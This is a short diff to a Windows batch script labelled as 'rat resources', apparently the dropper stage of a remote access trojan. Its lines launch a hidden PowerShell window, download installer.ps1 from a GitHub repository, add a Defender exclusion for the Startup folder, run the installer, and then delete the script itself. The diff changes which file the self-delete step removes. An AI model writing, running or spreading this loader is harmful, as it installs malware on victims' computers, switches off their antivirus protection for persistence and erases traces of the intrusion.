@@ -39,6 +39,6 @@ REM rat resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; ./installer.ps1
 
 @REM self delete
-del initial.cmd 
+del wget.cmd 
 
 
